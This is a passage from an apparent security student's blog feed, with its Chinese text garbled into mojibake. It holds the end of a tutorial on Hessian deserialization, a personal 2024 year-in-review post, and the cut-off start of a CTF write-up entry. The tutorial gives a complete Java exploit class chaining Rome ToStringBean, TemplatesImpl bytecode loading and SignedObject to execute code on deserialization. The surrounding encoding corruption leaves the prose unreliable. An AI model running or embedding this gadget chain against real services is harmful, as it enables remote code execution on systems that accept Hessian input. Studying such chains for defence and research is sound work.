class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¸¸æˆ‘ä»¬ä½¿ç”¨Romeç»“åˆTemplatesImplè¿›è¡Œåˆ©ç”¨ä¼šå‘ç°åˆ©ç”¨ä¸æˆåŠŸè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>è¿™é‡Œå…¶å®æ˜¯ç”±äºTemplatesImplç±»ä¸­è¢«<code>transient</code>ä¿®é¥°çš„<code>_tfactory</code>å±æ€§æ— æ³•è¢«åºåˆ—åŒ–ï¼Œè¿›è€Œå¯¼è‡´TemplatesImplç±»æ— æ³•åˆå§‹åŒ–</p><p>é‚£ä¹ˆä¸ºä»€ä¹ˆæˆ‘ä»¬ä¹‹å‰ä½¿ç”¨JavaåŸç”Ÿçš„ååºåˆ—åŒ–æ—¶ä¸ä¼šæŠ¥é”™å‘¢ï¼Ÿ</p><p>è¿™æ˜¯å› ä¸ºå¦‚æœåœ¨ååºåˆ—åŒ–æ—¶é‡å†™readObjectçš„ç±»ä¼šè‡ªåŠ¨è°ƒç”¨é‡å†™çš„readObjectæ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹TemplatesImplçš„readObjectæ–¹æ³•</p><img src="/2025/01/01/Java%E5%AE%89%E5%85%A8/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250104204344810.png" class=""><p>å¯ä»¥çœ‹åˆ°å®ƒæ‰‹åŠ¨new äº†ä¸€ä¸ªTransformerFactoryImplå¯¹è±¡ç»™_tfactoryã€‚å¦‚ä½•ç»•è¿‡å‘¢ï¼Œå°±æ˜¯ç»“åˆSignedObjectè¿›è¡ŒäºŒæ¬¡ååºåˆ—åŒ–å³å¯ç»•è¿‡å› ä¸ºSignedObjectä¸­çš„readObjectæ˜¯javaåŸç”Ÿçš„ï¼Œå…·ä½“åŸç†å‚è€ƒ<a href="https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">äºŒæ¬¡ååºåˆ—åŒ–</a>ç›´æ¥ç»™å‡ºPayload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;  </span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;  </span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.security.*;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_TemplatesImpl_SignedObject</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Hessian_stu/src/main/java/Exp.class&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);  </span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);  </span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);  </span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);  </span><br><span class="line">  </span><br><span class="line">        KeyPairGenerator keyPairGenerator;  </span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);  </span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);  </span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();  </span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();  </span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean1);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean, equalsBean);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] payload = Hessian2_Serial(hashMap);  </span><br><span class="line">        Hessian2_Deserial(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_Serial(Object o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);  </span><br><span class="line">        hessian2Output.writeObject(o);  </span><br><span class="line">        hessian2Output.flushBuffer();  </span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_Deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Hessian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024æ€»ç»“</title>
      <link href="/2024/12/31/%E9%97%B2%E8%B0%88/2024%E6%80%BB%E7%BB%93/"/>
      <url>/2024/12/31/%E9%97%B2%E8%B0%88/2024%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="åºè¨€"><a href="#åºè¨€" class="headerlink" title="åºè¨€"></a>åºè¨€</h2><p>ä¸ºä»€ä¹ˆè¦å†™æ€»ç»“å‘¢ï¼Œå…¶å®æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œåªæ˜¯çœ‹ç€å¾ˆå¤šå¸ˆå‚…éƒ½å†™è‡ªå·±ä¹Ÿæœ‰ä¸€ç§æƒ³è¡¨è¾¾çš„æ¬²æœ›ï¼Œè™½ç„¶è‡ªå·±å¾ˆèœã€‚ä½†æ˜¯è¿˜æ˜¯æƒ³å†™ç‚¹ä»€ä¹ˆã€‚</p><h2 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h2><p>å›æƒ³ä»Šå¹´è‡ªå·±å¹²äº†ä»€ä¹ˆï¼Œä¸€æ—¶é—´ä¹Ÿæƒ³ä¸èµ·æ¥ï¼Œæ„Ÿè§‰è‡ªå·±ä»€ä¹ˆéƒ½æ²¡å­¦åˆ°ï¼Œæ‰€ä»¥ä¹Ÿç®—æ˜¯è¿‡äº†ä¸€æ®µæ½‡æ´’çš„ç”Ÿæ´»ã€‚å› ä¸ºåœ¨å¤§å››çš„æ—¶å€™æ‹¿åˆ°äº†ä¿ç ”çš„offerä¹Ÿç®—æ˜¯å¯¹è‡ªå·±æœ¬ç§‘çš„å­¦ä¹ ç”»ä¸Šäº†ä¸€ä¸ªå¥å·ã€‚<br>åœ¨å›åˆ°å­¦æ ¡ä¹‹å‰ä¸€ç›´åœ¨å®¶é‡Œæ‘†çƒ‚ï¼Œæ›¾ç»ä¹Ÿæƒ³è¿‡å»å®ä¹ ï¼Œä½†æ˜¯ç”±äºè¢«æŠ¤ç½‘é«˜å·¥èµ„å±è”½äº†åŒçœ¼å¯¼è‡´è‡ªå·±æœ‰ç‚¹è§‰å¾—å»å®ä¹ ä¹Ÿå­¦ä¸åˆ°ä»€ä¹ˆä¸œè¥¿çš„æƒ³æ³•ï¼Œç°åœ¨å›å¤´å»æƒ³æƒ³å‘ç°è‡ªå·±è¿™ç§æƒ³æ³•æœ‰ç‚¹å‚»ï¼Œè™½ç„¶è¯´å®ä¹ å·¥èµ„ä½ï¼Œä¸è¯´å­¦ä¹ åˆ°æŠ€æœ¯ï¼Œè‡³å°‘ä¹Ÿèƒ½å­¦åˆ°ä¸€ç‚¹åœ¨èŒåœºçš„ç»éªŒã€‚<br>å›åˆ°å­¦æ ¡ä¹‹åç”Ÿæ´»å¼€å§‹å˜å¾—æ½‡æ´’ä¸€ç‚¹äº†ï¼Œè·Ÿèˆå‹ä¸€èµ·è€ï¼Œæ¯å¤©ç¡åˆ°12ç‚¹åŸºæœ¬ç¡é†’å°±å»æ‰“ğŸ±ï¼ˆğŸ²å¦ˆã€å‡ åœˆã€æ¬§æ¥æ¥ã€å½ªä½ ä»¬éƒ½è¿˜å¾—ç»ƒï¼‰ï¼ŒğŸ£ï¼ˆç¥¥å“¥çš„æœ€çˆ±ï¼‰ï¼Œå¤Ÿçº§â™¥ï¸ï¼ˆæœ€å–œæ¬¢å°æ™ºè·Ÿæˆ‘æ‰“å¯¹é—¨ï¼Œå–œæ¬¢ğŸ”¥å°è±ªã€ç”°ä¹¦è®°ï¼‰ï¼Œâš½ï¸ï¼ˆæ„Ÿè°¢æ—­å“¥ï¼ˆæµ·å‚é˜Ÿé•¿ï¼‰å¸¦æˆ‘æ‹¿ğŸ†ï¼‰ã€‚åæ­£æ˜¯èƒ½æ¶ˆè€—æ—¶é—´çš„äº‹éƒ½å¹²äº†ï¼ŒæœŸé—´è¿˜è·Ÿèˆå‹ä¸€èµ·å»çƒ§çƒ¤ï¼Œåšé¥­ï¼Œå½“ç„¶æˆ‘åªè´Ÿè´£å¸¦ä¸€ä¸ªæœ€å»å°±è¡Œï¼Œå¼ºçƒˆæ¨èå½ªå­ï¼Œå°è±ªçš„æ‰‹è‰ºä¸ç®¡æ˜¯åšèœè¿˜æ˜¯çƒ§çƒ¤éƒ½æ˜¯éå¸¸çš„å¥½åƒï¼Œç°åœ¨è¿˜éå¸¸æƒ³å¿µè¿™ä¸€å£ã€‚ä»€ä¹ˆå®åŠ›ä¸å¤šè¯´çœ‹å›¾</p><img src="/2024/12/31/%E9%97%B2%E8%B0%88/2024%E6%80%BB%E7%BB%93/IMAGE20241231123800029.png" class=""><p>4æœˆä»½çš„æ—¶å€™è·Ÿèˆå‹ä¸€èµ·å»å¨æµ·è‡ªé©¾æ¸¸ï¼Œè¿™é‡Œè¦æ„Ÿè°¢æˆ‘ä»¬çƒ­æƒ…çš„å°æ™ºç­é•¿ä¸ºæˆ‘ä»¬å½“ä½œå¯¼æ¸¸ï¼Œè¯·æˆ‘ä»¬åƒäº†ä¸¤é¡¿å¤§é¤ä¸€ä¸ªå°çƒ§çƒ¤ï¼Œè¿˜æœ‰ä¸°ç››çš„æµ·é²œå¤§é¤ã€‚çœ‹äº†å¨æµ·çš„é£æ™¯ï¼ŒçœŸçš„ä¸é”™å¾ˆæ¨èå¤§å®¶å»çœ‹çœ‹ã€‚é™„ä¸Šä¸€å¼ è½æ—¥ç¾æ™¯</p><img src="/2024/12/31/%E9%97%B2%E8%B0%88/2024%E6%80%BB%E7%BB%93/IMAGE20241231123956649.png" class=""><p>6æœˆä»½å°±æ˜¯æ¯•ä¸šäº†ï¼Œå¤§å®¶éƒ½å¾ˆä¸èˆï¼Œä½†æ˜¯æ²¡åŠæ³•ï¼Œè·¯è¿˜æ˜¯è¦èµ°çš„ï¼Œåªæ˜¯è¦è®°å¾—å¸¸èšèšã€‚ä¸æ­¤åŒæ—¶å‘¢æŠ¤ç½‘ä¹Ÿå¼€å§‹äº†ä»Šå¹´çš„æŠ¤ç½‘ä¸æƒ³æäº†ä¸€è¨€éš¾å°½å¤ªæŠ½è±¡äº†ä¸å¥½å¤šè¯´ä»€ä¹ˆä¸€ç¬”å¸¦è¿‡å§ï¼Œå”¯ä¸€å€¼å¾—ä¸€æçš„å°±æ˜¯å»å‚åŠ äº†äº’è”ç½‘å®‰å…¨å¤§ä¼šï¼Œå¬äº†ä¸€äº›è®²åº§å¹¶ä¸”è–…åˆ°äº†ä¸€äº›å‘¨è¾¹ã€‚</p><img src="/2024/12/31/%E9%97%B2%E8%B0%88/2024%E6%80%BB%E7%BB%93/IMAGE20241231124800538.png" class=""><p>8æœˆä»½åˆ°äº†å¼€å­¦çš„æ—¥å­ï¼Œå› ä¸ºæœ¬äººå­¦æ ¡å¼€å­¦ç®—æ˜¯ä¸­å›½å¼€å­¦æœ€æ—©æ”¾å‡æœ€æ™šçš„å­¦æ ¡äº†â˜¹ï¸ï¼Œä½†æ˜¯å› ä¸ºæœ‰æŠ¤ç½‘åˆåŒåœ¨èº«å°±è·Ÿå¯¼å¸ˆç”³è¯·äº†ä¸‹æ™šäº†ä¸¤ä¸ªæ˜ŸæœŸå›åˆ°çš„å­¦æ ¡ã€‚å›åˆ°å­¦æ ¡åï¼Œå› ä¸ºåˆ†åˆ°çš„å®¿èˆå…¶ä¸­ä¸¤ä½éƒ½æ˜¯æœ¬ç§‘å®éªŒå®¤çš„åŒå­¦ï¼Œå†åŠ ä¸Šä¸€ä¸ªä¹Ÿæ˜¯ä¿ç ”æ¥çš„PwnğŸ‘´æµ©å“¥ï¼Œè€Œä¸”éƒ½æ˜¯æ‰“CTFçš„ï¼ˆæœ¬äººå¾ˆèœï¼‰ï¼Œæˆ‘ä»¬å››ä¸ªå°±å¼€å§‹ä¸€èµ·æ‰¾æ¯”èµ›æ‰“æ¯”èµ›å½“ç„¶ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæˆç»©ï¼Œä½†æ˜¯ä¹Ÿæ‹¿åˆ°äº†ä¸€äº›å¥–ï¼Œè¿˜æœ‰ä¸€äº›çºªå¿µå“ã€‚</p><img src="/2024/12/31/%E9%97%B2%E8%B0%88/2024%E6%80%BB%E7%BB%93/IMAGE20241231124605322.png" class=""><p>åœ¨æ²¡ä¸Šç ”ç©¶ç”Ÿä¹‹å‰æˆ‘å¹»æƒ³çš„ç ”ç©¶ç”Ÿç”Ÿæ´»æ˜¯ä¸°å¯Œå¤šå½©çš„ï¼Œæ¥ä¹‹åæ‰å‘ç°ç†æƒ³å¾ˆä¸°æ»¡ï¼Œç°å®å¾ˆéª¨æ„Ÿã€‚ä¹‹å‰ä¼šæœ‰è¿‡è¯»åšçš„æƒ³æ³•ï¼Œä¸è¿‡ç°åœ¨çœ‹æ¥æ„Ÿè§‰è‡ªå·±æƒ³æ³•è¿˜æ˜¯æœ‰ç‚¹å¹´è½»äº†ï¼Œè®ºæ–‡ç®€ç›´æ˜¯æŠ˜ç£¨æ­»æˆ‘äº†ï¼Œè™½ç„¶ä¹Ÿæ²¡è¯»è¿‡å‡ ç¯‡ï¼Œå°±è¿™ä¹ˆå…ˆèµ°ä¸€æ­¥çœ‹ä¸€æ­¥å§æœ¬èº«ä¹Ÿæ²¡æœ‰ä»€ä¹ˆè§„åˆ’ã€‚å†™åˆ°è¿™æœ‰ç‚¹ä¸çŸ¥é“å†™ä»€ä¹ˆäº†ã€‚å°±å†™å½ªå­å§åœ¨å†¬è‡³é‚£å¤©æ™šä¸Š 20:00ç»™æˆ‘æ‰“æ¥äº†è§†é¢‘ç”µè¯ï¼Œå¼€å£å°±æ˜¯ç†Ÿæ‚‰çš„å£°éŸ³é—®æˆ‘åœ¨å“ªå‘¢ï¼Œæˆ‘å°±çŸ¥é“ä»–æ¥é’å²›äº†ï¼Œä¸è¿‡ä¹Ÿç¡®å®ç»™æˆ‘äº†ä¸€ä¸ªæƒŠå–œï¼Œè·Ÿä»–å–é…’å™æ—§ç¬¬äºŒå¤©é™ªä»–åœ¨é’å²›é€›äº†é€›æ™šä¸Šå°±é€ä»–å»äº†é«˜é“ç«™ï¼Œåªèƒ½æ„Ÿæ…¨æ—¶å…‰åŒ†åŒ†å‘ã€‚ä¹Ÿæƒ³å¿µå…¶ä»–èˆå‹æ¥æ‰¾æˆ‘å–é…’å™æ—§ã€‚è¿˜è¦å†™ä¸€ä¸ªå®«ğŸ‘´è¿™ä¸ªçœŸæ˜¯æˆ‘çš„å¥½å¸ˆå“¥ï¼Œåº”è¯¥è¯´æ—¢æ˜¯å¸ˆå“¥ä¹Ÿæ˜¯å¥½å…„å¼Ÿï¼Œå®«å“¥åœ¨æˆ‘å›°éš¾çš„æ—¶å€™å±¡æ¬¡å¸®åŠ©æˆ‘ï¼ŒçœŸçš„å¾ˆæ„Ÿæ¿€ä»–ï¼Œè™½è¯´å®«å“¥å¾ˆæŠ½è±¡ä½†æ˜¯æˆ‘ä¹Ÿçˆ±é™ªä»–ç©ç‚¹æŠ½è±¡ï¼Œç­‰æ—¶é—´ç©ºä¸‹æ¥è¦å»æ‰¾ä¸€è¶Ÿå®«å“¥ï¼Œçº¿ä¸‹ç©ç‚¹æŠ½è±¡å“ˆå“ˆå“ˆï¼ï¼ï¼<br>é‚»è¿‘å…ƒæ—¦çš„å‡ å¤©æ‰æƒ³èµ·æŠŠåšå®¢æ­å¥½ï¼Œå½“ç„¶è¿™å…¶ä¸­ä¹Ÿæ˜¯åºŸäº†å¥½å¤§åŠ²æ‰æ­å»ºæˆåŠŸåç»­å†™ä¸€ä¸‹è‡ªå·±æ­å»ºçš„ä¸»é¢˜è¿‡ç¨‹ï¼Œè‡ªå·±çš„è¿™ä¸ªä¸»é¢˜æ˜¯å½“æ—¶çœ‹çš„Pç‰›çš„ä¸»é¢˜è§‰å¾—éå¸¸ç®€æ´å¤§æ–¹å¾ˆå–œæ¬¢æ‰€ä»¥å°±å»æ‰¾äº†ä¸‹æ‹¿è¿‡æ¥ç”¨äº†ã€‚å…¶å®å¾ˆæ—©ä¹‹å‰è‡ªå·±å°±æ­å»ºè¿‡Blogåªä¸è¿‡å½“æ—¶å¤ªèœä¹ŸåŠ ä¸ŠæœåŠ¡å™¨è¿‡æœŸäº†å°±ä¸äº†äº†ä¹‹äº†ã€‚ç°åœ¨æ­å»ºèµ·æ¥ä¸€æ–¹é¢æ˜¯ä¸ºäº†æ–¹ä¾¿è®°å½•è‡ªå·±çš„å­¦ä¹ ç¬”è®°ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿæƒ³è®°å½•ä¸‹è‡ªå·±çš„ç”Ÿæ´»è‹¥å¹²å¹´åè¿˜èƒ½çœ‹çœ‹æˆ–è®¸æœ‰ä¸ä¸€æ ·çš„æ„Ÿè§‰ã€‚ä»Šå¹´çš„æ€»ç»“å°±åˆ°æ­¤ä¸ºæ­¢å§å¸Œæœ›æ–°çš„ä¸€å¹´ä¼šè¶Šæ¥è¶Šå¥½åŒæ—¶ä¹Ÿç¥æ„¿èº«è¾¹æ‰€æœ‰äººå’Œå¸ˆå‚…ä»¬è¶Šæ¥è¶Šå¥½ï¼ï¼ï¼</p><h2 id="è§„åˆ’"><a href="#è§„åˆ’" class="headerlink" title="è§„åˆ’"></a>è§„åˆ’</h2><p>å¯¹æ˜å¹´çš„è§„åˆ’ä¹Ÿä¸æ˜¯å¤ªæ¸…æ™°ç®€å•å†™å†™æ˜å¹´è¦åšçš„äº‹ã€‚ç»§ç»­å­¦ä¹ Javaæ¼æ´ï¼Œå¸Œæœ›èƒ½åœ¨CTFæ¯”èµ›å–å¾—æ›´å¥½çš„æˆç»©ï¼Œåœ¨å›é¡¾å›é¡¾æ”»é˜²æ¸—é€çš„çŸ¥è¯†ï¼Œåœ¨ç§‘ç ”æ–¹é¢å¸Œæœ›èƒ½åšå‡ºä¸€ç‚¹ä¸œè¥¿ï¼Œè¯¥å‡å‡è‚¥äº†ç¡®å®æœ‰ç‚¹è‚¥äº†ï¼Œå¤šå†™å†™åšå®¢åˆ†äº«è‡ªå·±ç”Ÿæ´»ï¼Œæ‰¾ä¸ªå¤§å‚å»æ¬ğŸ§±æ„Ÿå—ä¸€ä¸‹å­¦ä¹ å­¦ä¹ ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—²è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ€»ç»“ </tag>
            
            <tag> é—²èŠ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¾æ¯</title>
      <link href="/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/"/>
      <url>/2024/12/30/CTF/WP/%E5%90%BE%E6%9D%AF/</url>
      
